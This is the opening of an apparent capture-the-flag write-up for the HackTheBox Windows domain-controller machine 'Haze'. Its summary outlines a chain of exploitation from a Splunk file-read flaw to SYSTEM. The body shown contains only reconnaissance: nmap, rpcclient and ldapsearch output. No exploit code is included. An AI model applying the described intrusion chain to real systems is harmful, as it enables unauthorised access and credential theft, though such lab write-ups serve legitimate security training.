---
title: HackTheBox - Haze
date: 2026-06-26
image: cover.png
tags: [HackTheBox, Hard, Windows, Active Directory]
platform: HackTheBox
os: Windows
difficulty: Hard
points: 85
released: 2025-03-29
ip: 10.129.232.50
boxAvatar: htb-cover.png
excerpt: Haze is a hard difficulty Windows machine focused on web exploitation, domain abuse, and Windows privilege escalation. Initial access is gained by exploiting a Splunk Arbitrary File Read (CVE-2024-36991) to extract an LDAP bind password, which is then decrypted using splunk.secret. With valid credentials, a BloodHound scan reveals further accounts, and password spraying provides access to a user with GMSA management rights. This allows abuse of the PrincipalsAllowedToRetrieveManagedPassword property to dump hashes and pivot into a privileged service account. Using Shadow Credentials, access is escalated to another user. Backup files expose more credentials, eventually giving admin access to Splunk. Finally, a custom app upload enables a reverse shell, and SeImpersonatePrivilege is abused to impersonate SYSTEM, completing the escalation chain.
---

# Haze

### NMAP Scanning

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-26 17:49:34Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-26T17:50:40+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-26T17:50:39+00:00; +7h59m58s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-26T17:50:40+00:00; +7h59m59s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-26T17:50:39+00:00; +7h59m58s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.232.50:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
|_http-server-header: Splunkd
| http-methods:
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry
|_/
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
|_http-title: splunkd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62035/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62036/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62051/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62054/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62065/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62082/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 58886/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31161/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40694/udp): CLEAN (Failed to receive data)
|   Check 4 (port 58370/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-26T17:50:32
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
```

### RPC Enumeration

```bash
➜  haze rpcclient -U "" -N 10.129.232.50
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprinters
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

### SMB - Guest & NULL Authentication

{% image %}

Guest and null authentication both fail against SMB. The enumeration confirms the domain is `haze.htb`, the hostname is `DC01`, and the OS is `Windows Server 2022 Build 20348`. SMB signing is mandatory, which is expected on a domain controller and rules out NTLM relay attacks. The NMAP scan also identifies three Splunk-related ports - 8000, 8088, and 8089 - which are worth investigating as a potential initial access vector.

Adding the resolved names to `/etc/hosts`:

```bash
10.129.232.50	DC01.haze.htb haze.htb
```

### LDAP Enumeration

Getting the naming contexts:

```bash
➜  haze ldapsearch -x -H ldap://10.129.232.50 -s base namingcontexts
# extended LDIF
#
# LDAPv3
